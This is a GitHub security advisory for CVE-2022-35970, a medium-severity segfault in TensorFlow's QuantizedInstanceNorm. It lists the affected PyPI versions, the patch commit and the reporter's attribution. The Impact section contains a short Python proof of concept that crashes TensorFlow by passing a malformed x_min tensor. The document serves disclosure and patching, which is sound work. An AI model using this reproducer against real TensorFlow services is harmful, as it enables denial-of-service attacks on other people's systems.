# [M] TensorFlow vulnerable to segfault in `QuantizedInstanceNorm`

## Summary
Severity: Medium
Advisory: GHSA-g35r-369w-3fqp
CVE: CVE-2022-35970
CWE: CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-g35r-369w-3fqp
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
If `QuantizedInstanceNorm` is given `x_min` or `x_max` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

output_range_given = False
given_y_min = 0
given_y_max = 0
variance_epsilon = 1e-05
min_separation = 0.001
x = tf.constant(88, shape=[1,4,4,32], dtype=tf.quint8)
x_min = tf.constant([], shape=[0], dtype=tf.float32)
x_max = tf.constant(0, shape=[], dtype=tf.float32)
tf.raw_ops.QuantizedInstanceNorm(x=x, x_min=x_min, x_max=x_max, output_range_given=output_range_given, given_y_min=given_y_min, given_y_max=given_y_max, variance_epsilon=variance_epsilon, min_separation=min_separation)
```

### Patches
We have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-g35r-369w-3fqp
- https://nvd.nist.gov/vuln/detail/CVE-2022-35970
- https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
